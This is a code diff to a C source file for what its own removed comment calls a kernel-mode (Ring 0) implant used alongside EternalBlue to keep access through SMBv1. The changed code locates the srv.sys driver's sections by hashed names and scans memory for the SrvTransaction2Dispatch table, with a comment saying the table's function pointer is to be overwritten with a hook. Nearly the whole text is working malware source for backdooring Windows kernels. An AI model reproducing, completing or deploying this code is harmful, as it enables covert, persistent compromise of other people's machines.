@@ -30,41 +30,11 @@
 #include "hashes.h"
 
 #define INDEX_SESSION_SETUP 14
+
 #define RV2OFF(Base, Rva)(((ULONG_PTR)Base) + Rva) 
 #define NT_HDR(x) (PIMAGE_NT_HEADERS)\
 (RV2OFF(x, ((PIMAGE_DOS_HEADER)x)->e_lfanew))
 
-/* @brief Kernel Mode (Ring 0) Implant, used
- * alongside EternalBlue to maintain access
- * through smbv1.
- *
- * @return 0, on success and failure to "free"
- * the buffer.
- *
- * @variable Func Structure holding function 
- * pointers used in the implant.
- *
- * @variable Drvs Structure holding driver base
- * pointers used in the implant.
- *
- * @variable NtsHdr Pointer to the NT header of
- * the executable. Used to find the image size,
- * and image section header.
- *
- * @variable SecHdr Pointer to the image section
- * header of the executable. Used to find the 
- * .data section in memory, and section size.
- *
- * @variable SecPtr Pointer to the base of the 
- * .data section.
- *
- * @variable TrnTbl Array of function pointers
- * that will consist of the SrvTransaction2Dispacth
- * Table.
- *
- * @variable SecNum Size of the .data section, used
- * when parsing it to avoid going over bounds.
-!*/ 
 INT WindowsEntrypoint()
 {
   struct Functions Func = { 0 };
@@ -78,10 +48,13 @@ INT WindowsEntrypoint()
     PIMAGE_NT_HEADERS     NtsHdr = 0;
     PIMAGE_SECTION_HEADER SecHdr = 0;
 
-    LPVOID                SecPtr = 0;
+    LPVOID                SecPr1 = 0;
+    LPVOID                SecPr2 = 0;
     LPVOID               *TrnTbl = 0;
+    LPVOID               *TblPtr = 0;
     LPVOID                EndPtr = 0;
-    DWORD                 SecNum = 0;
+    DWORD                 SecNm1 = 0;
+    DWORD                 SecNm2 = 0;
 
     NtsHdr = NT_HDR(Drvs.SrvSmbv1Base);
     SecHdr = IMAGE_FIRST_SECTION(NtsHdr);
@@ -93,30 +66,45 @@ INT WindowsEntrypoint()
       if ( 
         HashStringDjb2(&SecHdr[i].Name, 0) == HASH_DATA
       ) { 
-        SecPtr = (LPVOID)RV2OFF(Drvs.SrvSmbv1Base, 
+        SecPr1 = (LPVOID)RV2OFF(Drvs.SrvSmbv1Base,
 	  SecHdr[i].VirtualAddress); 
-	SecNum = SecHdr[i].Misc.VirtualSize; break; 
+	SecNm1 = SecHdr[i].Misc.VirtualSize; 
+      };
+      if (
+	HashStringDjb2(&SecHdr[i].Name, 0) == HASH_PAGE
+      ) {
+	SecPr2 = (LPVOID)RV2OFF(Drvs.SrvSmbv1Base,
+	  SecHdr[i].VirtualAddress);
+	SecNm2 = SecHdr[i].Misc.VirtualSize;
       };
     };
 
-    TrnTbl = (LPVOID *)SecPtr;
+    TrnTbl = (LPVOID *)SecPr1;
 
     do {
-      if (( TrnTbl[9]  == TrnTbl[11])  &&
-	  ( TrnTbl[9]  == TrnTbl[12])  &&
-	  ( TrnTbl[11] == TrnTbl[12])  &&
-	  ( TrnTbl[18] == 0))
-      {
-        EndPtr = (LPVOID)(((ULONG_PTR)Drvs.SrvSmbv1Base)
-		+ NtsHdr->OptionalHeader.SizeOfImage);
-	if ( ((ULONG_PTR)Drvs.SrvSmbv1Base) < 
-	     ((ULONG_PTR)TrnTbl[0]) < 
-	     ((ULONG_PTR)EndPtr) ) break;
-      }; TrnTbl++;
-    } while ( SecNum-- != 0 );
+      ULONG_PTR START_PTR  = (ULONG_PTR)SecPr2; 
+      ULONG_PTR FINAL_PTR  = (ULONG_PTR)RV2OFF(SecPr2, SecNm2);
+      ULONG_PTR MIDDLE_PTR = (ULONG_PTR)TrnTbl[0];
 
-    TrnTbl[INDEX_SESSION_SETUP] = 0x0;
+      if ( (START_PTR < MIDDLE_PTR) && (FINAL_PTR > MIDDLE_PTR) &&
+	   (((ULONG_PTR)TrnTbl[18]) == 0) && 
+	   (((ULONG_PTR)TrnTbl[11]) == ((ULONG_PTR)TrnTbl[12])) &&
+	   (((ULONG_PTR)TrnTbl[11]) == ((ULONG_PTR)TrnTbl[9])))
+      {
+	/*
+	 * At this point, we should've reached 
+	 * srv!SrvTransaction2Dispatch Table,
+	 * and we can then copy over our hook,
+	 * and overwrite its function pointer 
+	 * with the hook.
+	!*/
+        TblPtr = TrnTbl; goto FoundTransactionTable;     
+      };
+      TrnTbl++;
+    } while ( SecNm1-- != 0 );
   };
+
+FoundTransactionTable:
 
   return 0;
 };
